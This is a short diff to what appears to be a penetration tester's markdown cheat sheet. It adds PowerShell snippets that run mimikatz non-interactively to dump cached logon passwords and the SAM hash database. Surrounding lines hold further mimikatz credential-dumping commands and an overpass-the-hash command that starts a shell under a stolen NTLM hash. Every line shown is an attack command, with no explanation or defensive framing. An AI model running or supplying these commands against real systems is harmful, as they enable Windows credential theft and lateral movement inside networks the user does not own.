@@ -250,7 +250,19 @@ token::elevate
 lsadump::sam
 sekurlsa::logonpasswords
 ```
+
+```powershell
+$results = .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
+echo $results
+```
+
+```powershell
+$results = .\mimikatz.exe privilege::debug token::elevate lsadump::sam exit
+echo $results
+```
+
 #pth #overpass-the-hash 
+
 ```powershell
 sekurlsa::pth /user:$USER /domain:$TARGET_DOMAIN /ntlm:$HASH /run:powershell
 #on the new powershell
